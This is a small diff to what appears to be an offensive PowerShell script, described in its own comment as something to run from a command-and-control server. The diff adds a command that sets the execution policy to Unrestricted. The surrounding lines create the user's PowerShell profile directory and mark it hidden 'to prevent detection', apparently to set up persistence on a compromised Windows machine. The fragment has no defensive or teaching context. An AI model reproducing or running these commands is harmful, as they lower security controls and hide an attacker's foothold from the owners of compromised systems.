@@ -1,5 +1,7 @@
 #NOTE: EVERYTHING below MUST be ran on your C2 SERVER via a POWERSHELL LAUNCHER
 
+Set-ExecutionPolicy Unrestricted
+
 # Create PowerShell profile directory as a hidden folder to prevent detection
 cd $env:USERPROFILE;$d="Documents\WindowsPowerShell\";New-Item -ItemType Directory -Name "$d";$h=Get-Item "$d";$h.Attributes="Hidden"
 
